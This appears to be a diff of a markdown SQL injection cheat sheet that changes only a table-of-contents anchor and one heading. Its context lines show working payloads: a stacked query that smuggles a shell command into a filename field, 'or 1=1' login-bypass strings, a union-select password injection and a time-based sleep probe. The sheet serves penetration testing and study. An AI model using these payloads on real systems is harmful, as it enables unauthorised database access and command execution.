@@ -5,7 +5,7 @@
 2. [SQL Injection with `LOAD_FILE` and `INTO OUTFILE`](#SQL-injection-with-load-file-and-into-outfile)
 3. [Exceptional Payloads](#exceptional)
 4. [Data Retrieval](#data-retrieval)
-5. [Determining SQL Injection Vulnerability & Login Bypass](#determining-sqli-vulnerability--login-bypass)
+5. [Determining SQL Injection Vulnerability & Login Bypass](#Determinig-SQLi-Vulnerablity-&-Login-Bypass)
 6. [Parameter Testing for Time-Based Blind SQL Injection](#parameter-testing-for-time-based-blind-sql-injection)
 7. [Cookie Testing](#cookie-testing)
 8. [Determining Column Numbers](#determining-column-numbers)
@@ -128,7 +128,7 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 1' or 1=1;-- -
 ' union select "pass" as password from <db_name> where '1'='1
 ```
-### Parameter Testing For Time Based Blind
+### Parameter Testing for Time-Based Blind SQL Injection
 ```sql
 or sleep(5)
 
